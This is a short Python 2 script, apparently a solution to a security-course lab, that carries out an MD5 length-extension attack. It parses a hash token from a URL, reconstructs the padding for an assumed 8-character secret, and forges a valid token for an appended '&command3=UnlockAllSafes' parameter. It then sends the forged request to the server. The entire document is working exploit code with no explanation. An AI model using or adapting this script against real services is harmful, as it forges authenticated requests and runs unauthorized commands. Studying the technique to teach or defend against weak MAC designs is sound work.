import httplib, urlparse, sys, urllib
from pymd5 import padding, md5

url = sys.argv[1]

# Parse token
token_start = url.index("token=") + 6
token_end = url.index("&")
token = url[token_start : token_end]

# Find length of message
# Password length (8) + length starting with "user="
message_index = url.index("user=")
url_message = url[message_index:]
message_length = 8 + len(url_message)

# Calculate padded length
bits = (message_length + len(padding(message_length *8)))*8

# Set internal state of MD5
h = md5(state=token.decode("hex"), count=bits)

# Apply to longer message
new_command = "&command3=UnlockAllSafes"
h.update(new_command)
new_token = h.hexdigest()

# Add to URL
new_url = url[:token_start] + new_token + url[token_end:] + urllib.quote(padding(message_length * 8)) + new_command

parsedUrl = urlparse.urlparse(new_url)
conn = httplib.HTTPConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()